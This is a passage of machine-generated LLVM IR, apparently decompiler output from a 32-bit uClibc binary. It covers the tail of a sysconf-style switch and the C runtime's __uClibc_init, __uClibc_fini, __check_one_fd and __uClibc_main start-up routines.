    i32 43, label %dec_label_pc_8055506
    i32 44, label %dec_label_pc_8055514
    i32 45, label %dec_label_pc_8055506
    i32 46, label %dec_label_pc_80554c2
    i32 47, label %dec_label_pc_80554c2
    i32 48, label %dec_label_pc_80554c2
    i32 49, label %dec_label_pc_80554ec
    i32 50, label %dec_label_pc_80554ec
    i32 51, label %dec_label_pc_80554c2
    i32 52, label %dec_label_pc_80554c2
    i32 53, label %dec_label_pc_80554ec
    i32 54, label %dec_label_pc_80554ec
    i32 55, label %dec_label_pc_80554ec
    i32 56, label %dec_label_pc_80554ec
    i32 57, label %dec_label_pc_80554ec
    i32 58, label %dec_label_pc_80554ec
    i32 59, label %dec_label_pc_80554ec
    i32 60, label %dec_label_pc_80554ec
    i32 61, label %dec_label_pc_80554ec
    i32 62, label %dec_label_pc_80554ec
    i32 63, label %dec_label_pc_80554ec
    i32 64, label %dec_label_pc_80554ec
    i32 65, label %dec_label_pc_80554ec
    i32 66, label %dec_label_pc_80554ec
    i32 67, label %dec_label_pc_80553ed
    i32 68, label %dec_label_pc_80553ed
    i32 69, label %dec_label_pc_80554d0
    i32 70, label %dec_label_pc_80554d0
    i32 71, label %dec_label_pc_80554d0
    i32 72, label %dec_label_pc_80554d7
    i32 73, label %dec_label_pc_80554de
    i32 74, label %dec_label_pc_80554e5
    i32 75, label %dec_label_pc_8055453
    i32 76, label %dec_label_pc_80554e5
    i32 77, label %dec_label_pc_80553ed
    i32 78, label %dec_label_pc_80553ed
    i32 79, label %dec_label_pc_80553ed
    i32 80, label %dec_label_pc_80553ed
    i32 81, label %dec_label_pc_80553ed
    i32 82, label %dec_label_pc_80553ed
    i32 83, label %dec_label_pc_80553ed
    i32 84, label %dec_label_pc_80553ed
    i32 85, label %dec_label_pc_80554ec
    i32 86, label %dec_label_pc_80554ec
    i32 87, label %dec_label_pc_80554c9
    i32 88, label %dec_label_pc_805545d
    i32 89, label %dec_label_pc_8055467
    i32 90, label %dec_label_pc_80554de
    i32 91, label %dec_label_pc_80553ed
    i32 92, label %dec_label_pc_80553ed
    i32 93, label %dec_label_pc_80553ed
    i32 94, label %dec_label_pc_80553ed
    i32 95, label %dec_label_pc_80554c2
    i32 96, label %dec_label_pc_80554ec
    i32 97, label %dec_label_pc_80554ec
    i32 98, label %dec_label_pc_80553ed
    i32 99, label %dec_label_pc_80553ed
    i32 100, label %dec_label_pc_80553ed
    i32 101, label %dec_label_pc_8055471
    i32 102, label %dec_label_pc_80554b4
    i32 103, label %dec_label_pc_80554f1
    i32 104, label %dec_label_pc_80554c9
    i32 105, label %dec_label_pc_805547b
    i32 106, label %dec_label_pc_80554d7
    i32 107, label %dec_label_pc_80554d7
    i32 108, label %dec_label_pc_80554bb
    i32 109, label %dec_label_pc_80554f8
    i32 110, label %dec_label_pc_8055514
    i32 111, label %dec_label_pc_80554b4
    i32 112, label %dec_label_pc_80554f1
    i32 113, label %dec_label_pc_8055514
    i32 114, label %dec_label_pc_8055485
    i32 115, label %dec_label_pc_805550d
    i32 116, label %dec_label_pc_80554ec
    i32 117, label %dec_label_pc_80554ec
    i32 118, label %dec_label_pc_805548f
    i32 119, label %dec_label_pc_8055499
    i32 120, label %dec_label_pc_8055506
    i32 121, label %dec_label_pc_80554c9
    i32 122, label %dec_label_pc_80554c9
    i32 123, label %dec_label_pc_80554c9
    i32 124, label %dec_label_pc_80554c9
    i32 125, label %dec_label_pc_80553ed
    i32 126, label %dec_label_pc_80553ed
    i32 127, label %dec_label_pc_80554ec
    i32 128, label %dec_label_pc_80554ec
    i32 129, label %dec_label_pc_80553ed
    i32 130, label %dec_label_pc_80553ed
    i32 131, label %dec_label_pc_80554ec
    i32 149, label %dec_label_pc_80554a0
  ]

dec_label_pc_80553ed:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8055519

dec_label_pc_80553f7:                             ; preds = %entry
  %v1_80553f7 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_80553fc = inttoptr i32 %v1_80553f7 to i32*
  store i32 22, i32* %v1_80553fc, align 4
  br label %dec_label_pc_80554ec

dec_label_pc_8055407:                             ; preds = %entry
  br label %dec_label_pc_8055519

dec_label_pc_8055411:                             ; preds = %entry
  br label %dec_label_pc_8055519

dec_label_pc_805541b:                             ; preds = %entry
  br label %dec_label_pc_8055519

dec_label_pc_8055425:                             ; preds = %entry
  %v1_8055428 = call i32 @getdtablesize(i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_805542d

dec_label_pc_805542d:                             ; preds = %entry, %dec_label_pc_8055425
  br label %dec_label_pc_8055519

dec_label_pc_8055437:                             ; preds = %entry
  %v0_805543a = call i32 @__GI_getpagesize()
  br label %dec_label_pc_805543f

dec_label_pc_805543f:                             ; preds = %entry, %dec_label_pc_8055437
  br label %dec_label_pc_8055519

dec_label_pc_8055449:                             ; preds = %entry
  br label %dec_label_pc_8055519

dec_label_pc_8055453:                             ; preds = %entry
  br label %dec_label_pc_8055519

dec_label_pc_805545d:                             ; preds = %entry
  br label %dec_label_pc_8055519

dec_label_pc_8055467:                             ; preds = %entry
  br label %dec_label_pc_8055519

dec_label_pc_8055471:                             ; preds = %entry
  br label %dec_label_pc_8055519

dec_label_pc_805547b:                             ; preds = %entry
  br label %dec_label_pc_8055519

dec_label_pc_8055485:                             ; preds = %entry
  br label %dec_label_pc_8055519

dec_label_pc_805548f:                             ; preds = %entry
  br label %dec_label_pc_8055519

dec_label_pc_8055499:                             ; preds = %entry
  br label %dec_label_pc_8055519

dec_label_pc_80554a0:                             ; preds = %entry
  %v5_80554a6 = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_80554ae = icmp slt i32 %v5_80554a6, 0
  %v1_80554b0 = icmp eq i1 %v2_80554ae, false
  br i1 %v1_80554b0, label %dec_label_pc_80554c2, label %dec_label_pc_80554ec

dec_label_pc_80554b4:                             ; preds = %entry, %entry
  br label %dec_label_pc_8055519

dec_label_pc_80554bb:                             ; preds = %entry, %entry
  br label %dec_label_pc_8055519

dec_label_pc_80554c2:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_80554a0
  br label %dec_label_pc_8055519

dec_label_pc_80554c9:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8055519

dec_label_pc_80554d0:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8055519

dec_label_pc_80554d7:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8055519

dec_label_pc_80554de:                             ; preds = %entry, %entry
  br label %dec_label_pc_8055519

dec_label_pc_80554e5:                             ; preds = %entry, %entry
  br label %dec_label_pc_8055519

dec_label_pc_80554ec:                             ; preds = %dec_label_pc_80554a0, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_80553f7
  br label %dec_label_pc_8055519

dec_label_pc_80554f1:                             ; preds = %entry, %entry
  br label %dec_label_pc_8055519

dec_label_pc_80554f8:                             ; preds = %entry, %entry
  br label %dec_label_pc_8055519

dec_label_pc_80554ff:                             ; preds = %entry, %entry
  br label %dec_label_pc_8055519

dec_label_pc_8055506:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8055519

dec_label_pc_805550d:                             ; preds = %entry, %entry
  br label %dec_label_pc_8055519

dec_label_pc_8055514:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_8055519

dec_label_pc_8055519:                             ; preds = %dec_label_pc_805550d, %dec_label_pc_8055506, %dec_label_pc_80554ff, %dec_label_pc_80554f8, %dec_label_pc_80554f1, %dec_label_pc_80554e5, %dec_label_pc_80554de, %dec_label_pc_80554d7, %dec_label_pc_80554d0, %dec_label_pc_80554c9, %dec_label_pc_80554bb, %dec_label_pc_80554b4, %dec_label_pc_80554c2, %dec_label_pc_8055499, %dec_label_pc_805548f, %dec_label_pc_8055485, %dec_label_pc_805547b, %dec_label_pc_8055471, %dec_label_pc_8055467, %dec_label_pc_805545d, %dec_label_pc_8055453, %dec_label_pc_8055449, %dec_label_pc_805543f, %dec_label_pc_805542d, %dec_label_pc_805541b, %dec_label_pc_8055411, %dec_label_pc_8055407, %dec_label_pc_80553ed, %dec_label_pc_80554ec, %dec_label_pc_8055514
  %v0_805551c = phi i32 [ 255, %dec_label_pc_805550d ], [ 2048, %dec_label_pc_8055506 ], [ 99, %dec_label_pc_80554ff ], [ 20, %dec_label_pc_80554f8 ], [ -128, %dec_label_pc_80554f1 ], [ 1024, %dec_label_pc_80554e5 ], [ 4, %dec_label_pc_80554de ], [ 32, %dec_label_pc_80554d7 ], [ 256, %dec_label_pc_80554d0 ], [ 2147483647, %dec_label_pc_80554c9 ], [ 16, %dec_label_pc_80554bb ], [ 127, %dec_label_pc_80554b4 ], [ 200112, %dec_label_pc_80554c2 ], [ 9, %dec_label_pc_8055499 ], [ 65535, %dec_label_pc_805548f ], [ -32768, %dec_label_pc_8055485 ], [ -2147483648, %dec_label_pc_805547b ], [ 8, %dec_label_pc_8055471 ], [ 500, %dec_label_pc_8055467 ], [ 4096, %dec_label_pc_805545d ], [ 16384, %dec_label_pc_8055453 ], [ 1000, %dec_label_pc_8055449 ], [ 32768, %dec_label_pc_805543f ], [ 6, %dec_label_pc_805542d ], [ 65536, %dec_label_pc_805541b ], [ 100, %dec_label_pc_8055411 ], [ 131072, %dec_label_pc_8055407 ], [ 1, %dec_label_pc_80553ed ], [ -1, %dec_label_pc_80554ec ], [ 32767, %dec_label_pc_8055514 ]
  ret i32 %v0_805551c

; uselistorder directives
  uselistorder i32 1000, { 2, 0, 1, 3 }
  uselistorder i32 16384, { 0, 10, 5, 6, 7, 8, 9, 4, 1, 2, 3 }
  uselistorder i32 -2147483648, { 4, 6, 7, 3, 5, 9, 0, 1, 2, 8 }
  uselistorder i32 (i32)* @getdtablesize, { 3, 2, 1, 0 }
  uselistorder i32 149, { 2, 1, 3, 0 }
  uselistorder i32 129, { 1, 0 }
  uselistorder i32 126, { 1, 0 }
  uselistorder i32 125, { 1, 0 }
  uselistorder i32 124, { 2, 1, 0 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 122, { 1, 0 }
  uselistorder i32 121, { 1, 0 }
  uselistorder i32 119, { 1, 0 }
  uselistorder i32 118, { 1, 0 }
  uselistorder i32 117, { 1, 0 }
  uselistorder i32 115, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 113, { 1, 0 }
  uselistorder i32 111, { 1, 0 }
  uselistorder i32 110, { 1, 0 }
  uselistorder i32 109, { 1, 0 }
  uselistorder i32 108, { 1, 0 }
  uselistorder i32 107, { 1, 0 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 105, { 1, 0 }
  uselistorder i32 103, { 1, 0 }
  uselistorder i32 99, { 1, 2, 0 }
  uselistorder i32 98, { 1, 0 }
  uselistorder i32 96, { 1, 0 }
  uselistorder i32 95, { 4, 2, 1, 3, 0 }
  uselistorder i32 94, { 1, 0 }
  uselistorder i32 93, { 1, 0 }
  uselistorder i32 92, { 2, 1, 0 }
  uselistorder i32 91, { 1, 0 }
  uselistorder i32 90, { 1, 0 }
  uselistorder i32 89, { 1, 0 }
  uselistorder i32 87, { 1, 2, 0 }
  uselistorder i32 86, { 1, 0 }
  uselistorder i32 85, { 1, 0 }
  uselistorder i32 83, { 1, 0 }
  uselistorder i32 82, { 1, 0 }
  uselistorder i32 81, { 1, 0 }
  uselistorder i32 79, { 1, 0 }
  uselistorder i32 78, { 1, 0 }
  uselistorder i32 77, { 1, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 74, { 1, 0 }
  uselistorder i32 73, { 1, 0 }
  uselistorder i32 71, { 1, 0 }
  uselistorder i32 70, { 2, 3, 1, 0 }
  uselistorder i32 66, { 1, 0 }
  uselistorder i32 65, { 3, 0, 1, 2 }
  uselistorder i32 63, { 1, 2, 0 }
  uselistorder i32 62, { 1, 0 }
  uselistorder i32 61, { 1, 0 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 57, { 2, 0, 1 }
  uselistorder i32 55, { 1, 2, 0 }
  uselistorder i32 54, { 1, 0 }
  uselistorder i32 53, { 1, 0 }
  uselistorder i32 50, { 2, 0, 1 }
  uselistorder i32 49, { 2, 1, 0 }
  uselistorder i32 47, { 2, 0, 1 }
  uselistorder i32 39, { 3, 1, 2, 0 }
  uselistorder i32 38, { 2, 3, 1, 0 }
  uselistorder i32 30, { 7, 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 29, { 1, 0 }
  uselistorder i32 26, { 3, 2, 0, 1 }
  uselistorder i32 25, { 1, 0 }
  uselistorder i32 23, { 1, 2, 0 }
  uselistorder i32 19, { 2, 1, 3, 0 }
  uselistorder i32 18, { 1, 0 }
  uselistorder label %dec_label_pc_8055519, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_80554ec, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_80554c2, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_805543f, { 1, 0 }
  uselistorder label %dec_label_pc_805542d, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055520 = load i32, i32* @ebx, align 4
  store i32 %v0_8055520, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e000.558 to i32), i32 -134602752), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e000.558 to i32), i32 -134602752), i32 2), i32 0), label %dec_label_pc_8055534, label %dec_label_pc_8055541

dec_label_pc_8055534:                             ; preds = %entry, %dec_label_pc_8055534
  %v1_805553b8 = phi i32 [ %v1_805553b, %dec_label_pc_8055534 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e000.558 to i32), i32 -134602752), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_805553b.559 to i32), i32* %stack_var_-16, align 4
  %v5_8055534 = mul i32 %v1_805553b8, 4
  %v6_8055534 = add i32 %v5_8055534, ptrtoint (i32* @global_var_805e000.558 to i32)
  %v7_8055534 = inttoptr i32 %v6_8055534 to i32*
  %v8_8055534 = load i32, i32* %v7_8055534, align 4
  call void @__pseudo_call(i32 %v8_8055534)
  %v0_805553b.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805553b = add i32 %v0_805553b.pre, -1
  store i32 %v1_805553b, i32* %ebx.global-to-local, align 4
  %v10_805553c = icmp eq i32 %v0_805553b.pre, 0
  %v1_805553f = icmp eq i1 %v10_805553c, false
  br i1 %v1_805553f, label %dec_label_pc_8055534, label %dec_label_pc_8055541

dec_label_pc_8055541:                             ; preds = %dec_label_pc_8055534, %entry
  %v0_8055541 = load i32, i32* @global_var_80646d4.560, align 4
  %v1_8055546 = icmp eq i32 %v0_8055541, 0
  br i1 %v1_8055546, label %dec_label_pc_805554c, label %dec_label_pc_805554a

dec_label_pc_805554a:                             ; preds = %dec_label_pc_8055541
  %v0_805554a = load i32, i32* %stack_var_-16, align 4
  %v1_805554a = call i32 @unknown_0(i32 %v0_805554a)
  br label %dec_label_pc_805554c

dec_label_pc_805554c:                             ; preds = %dec_label_pc_805554a, %dec_label_pc_8055541
  %v0_805554c = load i32, i32* @global_var_80646d8.561, align 8
  %v1_8055552 = icmp eq i32 %v0_805554c, 0
  br i1 %v1_8055552, label %dec_label_pc_805555b, label %dec_label_pc_8055556

dec_label_pc_8055556:                             ; preds = %dec_label_pc_805554c
  %v2_8055556 = load i32, i32* %stack_var_-16, align 4
  %v1_8055559 = call i32 @unknown_0(i32 %v2_8055556)
  br label %dec_label_pc_805555b

dec_label_pc_805555b:                             ; preds = %dec_label_pc_8055556, %dec_label_pc_805554c
  %v2_805555b = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_805555b

; uselistorder directives
  uselistorder i32 %v1_805553b, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8055534, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8055562 = load i32, i32* @eax, align 4
  ret i32 %v0_8055562
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8055563 = load i32, i32* @esi, align 4
  %v0_8055564 = load i32, i32* @eax, align 4
  store i32 %v0_8055564, i32* @esi, align 4
  %v0_8055566 = load i32, i32* @ebx, align 4
  store i32 %v0_8055566, i32* %stack_var_-8, align 4
  %v0_8055567 = load i32, i32* @edx, align 4
  store i32 %v0_8055567, i32* @ebx, align 4
  %v4_805556f = call i32 @__libc_fcntl(i32 %v0_8055564, i32 1, i32 %tmp6)
  %v8_8055577 = icmp eq i32 %v4_805556f, -1
  %v1_8055578 = icmp eq i1 %v8_8055577, false
  br i1 %v1_8055578, label %dec_label_pc_8055593, label %dec_label_pc_805557a

dec_label_pc_805557a:                             ; preds = %entry
  %v0_805557c = load i32, i32* @ebx, align 4
  %v5_8055582 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805d04c.562, i32 0, i32 0), i32 %v0_805557c)
  %v1_805558a = load i32, i32* @esi, align 4
  %v12_805558a = icmp eq i32 %v5_8055582, %v1_805558a
  br i1 %v12_805558a, label %dec_label_pc_8055593, label %dec_label_pc_805558e

dec_label_pc_805558e:                             ; preds = %dec_label_pc_805557a
  %v0_805558e = call i32 @abort()
  br label %dec_label_pc_8055593

dec_label_pc_8055593:                             ; preds = %entry, %dec_label_pc_805557a, %dec_label_pc_805558e
  %v2_8055593 = load i32, i32* %stack_var_-12, align 4
  %v2_8055594 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8055594, i32* @ebx, align 4
  store i32 %v0_8055563, i32* @esi, align 4
  ret i32 %v2_8055593

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8055593, { 2, 1, 0 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_805559a = load i8, i8* @global_var_80646dc.563, align 4
  %v1_805559a = icmp eq i8 %v0_805559a, 0
  %v1_80555a1 = icmp eq i1 %v1_805559a, false
  br i1 %v1_80555a1, label %entry.dec_label_pc_80555d3_crit_edge, label %dec_label_pc_80555a3

entry.dec_label_pc_80555d3_crit_edge:             ; preds = %entry
  %v0_80555d6.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80555d3

dec_label_pc_80555a3:                             ; preds = %entry
  store i8 1, i8* @global_var_80646dc.563, align 4
  store i32 4096, i32* @global_var_80646d0.564, align 16
  %v0_80555ce = call i32 @_stdio_init()
  br label %dec_label_pc_80555d3

dec_label_pc_80555d3:                             ; preds = %entry.dec_label_pc_80555d3_crit_edge, %dec_label_pc_80555a3
  %v0_80555d6 = phi i32 [ %v0_80555d6.pre, %entry.dec_label_pc_80555d3_crit_edge ], [ %v0_80555ce, %dec_label_pc_80555a3 ]
  ret i32 %v0_80555d6

; uselistorder directives
  uselistorder i8* @global_var_80646dc.563, { 1, 0 }
  uselistorder label %dec_label_pc_80555d3, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp28 = ptrtoint i32* %arg2 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %v0_80555d9 = load i32, i32* @esi, align 4
  store i32 %tmp28, i32* @edi, align 4
  store i32 %arg6, i32* @global_var_80646c8.565, align 8
  store i32 %arg5, i32* @global_var_80646d8.561, align 8
  %v2_805560e = mul i32 %arg1, 4
  %v3_805560e = add i32 %tmp28, %v2_805560e
  %v1_8055611 = add i32 %v3_805560e, 4
  store i32 %v1_8055611, i32* @global_var_80646cc.556, align 4
  %v3_805561a = load i32, i32* %arg2, align 4
  %v14_805561a = icmp eq i32 %v1_8055611, %v3_805561a
  store i32 0, i32* %stack_var_-168, align 4
  %v1_8055620 = icmp eq i1 %v14_805561a, false
  %v4_8055620 = select i1 %v1_8055620, i32 %v1_8055611, i32 %v3_805560e
  store i32 %v4_8055620, i32* @global_var_80646cc.556, align 4
  %v2_8055628 = ptrtoint i32* %stack_var_-136 to i32
  %v3_805562d = bitcast i32* %stack_var_-136 to i8*
  %v4_805562d = call i32 @__GI_memset(i8* %v3_805562d, i32 0, i32 120)
  %v0_8055632 = load i32, i32* @global_var_80646cc.556, align 4
  br label %dec_label_pc_805563a

dec_label_pc_805563a:                             ; preds = %dec_label_pc_805563a, %entry
  %v0_805563a = phi i32 [ %v1_805563d, %dec_label_pc_805563a ], [ %v0_8055632, %entry ]
  %v1_805563a = inttoptr i32 %v0_805563a to i32*
  %v2_805563a = load i32, i32* %v1_805563a, align 4
  %v3_805563a = icmp eq i32 %v2_805563a, 0
  %v1_805563d = add i32 %v0_805563a, 4
  %v1_8055640 = icmp eq i1 %v3_805563a, false
  br i1 %v1_8055640, label %dec_label_pc_805563a, label %dec_label_pc_8055661.preheader

dec_label_pc_8055661.preheader:                   ; preds = %dec_label_pc_805563a
  store i32 %v1_805563d, i32* @ebx, align 4
  %v1_80556611 = inttoptr i32 %v1_805563d to i32*
  %v2_80556612 = load i32, i32* %v1_80556611, align 4
  %v3_80556613 = icmp eq i32 %v2_80556612, 0
  %v1_805566410 = icmp eq i1 %v3_80556613, false
  br i1 %v1_805566410, label %dec_label_pc_8055646.lr.ph, label %dec_label_pc_8055666

dec_label_pc_8055646.lr.ph:                       ; preds = %dec_label_pc_8055661.preheader
  %v3_805561e = ptrtoint i32* %stack_var_-168 to i32
  %v3_8055651 = add i32 %v3_805561e, 32
  br label %dec_label_pc_8055646

dec_label_pc_8055646:                             ; preds = %dec_label_pc_8055646.lr.ph, %dec_label_pc_805565e
  %v1_8055651 = phi i32 [ %v2_80556612, %dec_label_pc_8055646.lr.ph ], [ %v2_8055661, %dec_label_pc_805565e ]
  %v0_8055650 = phi i32 [ %v1_805563d, %dec_label_pc_8055646.lr.ph ], [ %v1_805565e, %dec_label_pc_805565e ]
  %v6_805564b = icmp ugt i32 %v1_8055651, 14
  br i1 %v6_805564b, label %dec_label_pc_805565e, label %dec_label_pc_805564d

dec_label_pc_805564d:                             ; preds = %dec_label_pc_8055646
  store i32 %v0_8055650, i32* %stack_var_-168, align 4
  %v2_8055651 = mul i32 %v1_8055651, 8
  %v4_8055651 = add i32 %v3_8055651, %v2_8055651
  %v3_8055656 = inttoptr i32 %v4_8055651 to i16*
  %v4_8055656 = call i32 @memcpy(i16* %v3_8055656, i32 %v0_8055650, i32 8)
  %v0_805565e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805565e

dec_label_pc_805565e:                             ; preds = %dec_label_pc_8055646, %dec_label_pc_805564d
  %v0_805565e = phi i32 [ %v0_8055650, %dec_label_pc_8055646 ], [ %v0_805565e.pre, %dec_label_pc_805564d ]
  %v1_805565e = add i32 %v0_805565e, 8
  store i32 %v1_805565e, i32* @ebx, align 4
  %v1_8055661 = inttoptr i32 %v1_805565e to i32*
  %v2_8055661 = load i32, i32* %v1_8055661, align 4
  %v3_8055661 = icmp eq i32 %v2_8055661, 0
  %v1_8055664 = icmp eq i1 %v3_8055661, false
  br i1 %v1_8055664, label %dec_label_pc_8055646, label %dec_label_pc_8055666

dec_label_pc_8055666:                             ; preds = %dec_label_pc_805565e, %dec_label_pc_8055661.preheader
  store i32 %v2_8055628, i32* @eax, align 4
  %v0_805566a = call i32 @_dl_aux_init()
  store i32 %v0_805566a, i32* @eax, align 4
  %v0_805566f = call i32 @__GI___uClibc_init()
  %v1_805567d = icmp eq i32 %tmp23, 0
  %v3_805567f = select i1 %v1_805567d, i32 4096, i32 %tmp23
  %v13_8055682 = icmp eq i32 %tmp22, -1
  store i32 %v3_805567f, i32* @global_var_80646d0.564, align 16
  %v1_805568c = icmp eq i1 %v13_8055682, false
  br i1 %v1_805568c, label %dec_label_pc_80556b7, label %dec_label_pc_805568e

dec_label_pc_805568e:                             ; preds = %dec_label_pc_8055666
  %v0_805568e = call i32 @getuid()
  store i32 %v0_805568e, i32* @ebx, align 4
  %v0_8055695 = call i32 @geteuid()
  %v0_805569a = load i32, i32* @ebx, align 4
  %v12_805569a = icmp eq i32 %v0_805569a, %v0_8055695
  %v1_805569c = icmp eq i1 %v12_805569a, false
  br i1 %v1_805569c, label %dec_label_pc_80556cd, label %dec_label_pc_805569e

dec_label_pc_805569e:                             ; preds = %dec_label_pc_805568e
  %v0_805569e = call i32 @getgid()
  store i32 %v0_805569e, i32* @ebx, align 4
  %v0_80556a5 = call i32 @getegid()
  %v0_80556aa = load i32, i32* @ebx, align 4
  %v12_80556aa = icmp eq i32 %v0_80556aa, %v0_80556a5
  %v1_80556ac = icmp eq i1 %v12_80556aa, false
  br i1 %v1_80556ac, label %dec_label_pc_80556cd, label %dec_label_pc_80556ae.thread

dec_label_pc_80556ae.thread:                      ; preds = %dec_label_pc_805569e
  br label %dec_label_pc_80556f7

dec_label_pc_80556b7:                             ; preds = %dec_label_pc_8055666
  %v15_80556b7 = icmp eq i32 %tmp22, %tmp21
  %v1_80556bb = icmp eq i1 %v15_80556b7, false
  br i1 %v1_80556bb, label %dec_label_pc_80556cd, label %dec_label_pc_80556bd

dec_label_pc_80556bd:                             ; preds = %dec_label_pc_80556b7
  br label %dec_label_pc_80556cd

dec_label_pc_80556cd:                             ; preds = %dec_label_pc_80556bd, %dec_label_pc_80556b7, %dec_label_pc_805569e, %dec_label_pc_805568e
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_80556d4 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_80556e3 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_80556f2 = call i32 @__check_one_fd()
  br label %dec_label_pc_80556f7

dec_label_pc_80556f7:                             ; preds = %dec_label_pc_80556ae.thread, %dec_label_pc_80556cd
  %v0_80556f7 = load i32, i32* @edi, align 4
  %v1_80556f7 = inttoptr i32 %v0_80556f7 to i32*
  %v2_80556f7 = load i32, i32* %v1_80556f7, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e000.558 to i32), i32 -134602752), i32 2), i32* %esi.global-to-local, align 4
  store i32 %v2_80556f7, i32* inttoptr (i32 134603832 to i32*), align 8
  store i32 %arg4, i32* @global_var_80646d4.560, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e000.558 to i32), i32 -134602752), i32 2), i32 0), label %dec_label_pc_805571c, label %dec_label_pc_8055728

dec_label_pc_805571c:                             ; preds = %dec_label_pc_80556f7, %dec_label_pc_805571c
  %v4_805571c54 = phi i32 [ %v1_8055723, %dec_label_pc_805571c ], [ 0, %dec_label_pc_80556f7 ]
  %v5_805571c = mul i32 %v4_805571c54, 4
  %v6_805571c = add i32 %v5_805571c, ptrtoint (i32* @global_var_805e000.558 to i32)
  %v7_805571c = inttoptr i32 %v6_805571c to i32*
  %v8_805571c = load i32, i32* %v7_805571c, align 4
  call void @__pseudo_call(i32 %v8_805571c)
  %v0_8055723 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055723 = add i32 %v0_8055723, 1
  store i32 %v1_8055723, i32* %ebx.global-to-local, align 4
  %v1_8055724 = load i32, i32* %esi.global-to-local, align 4
  %v7_8055724 = icmp ult i32 %v1_8055723, %v1_8055724
  br i1 %v7_8055724, label %dec_label_pc_805571c, label %dec_label_pc_8055728

dec_label_pc_8055728:                             ; preds = %dec_label_pc_805571c, %dec_label_pc_80556f7
  call void @__pseudo_call(i32 %arg3)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e000.558 to i32), i32 -134602752), i32 2), i32* %esi.global-to-local, align 4
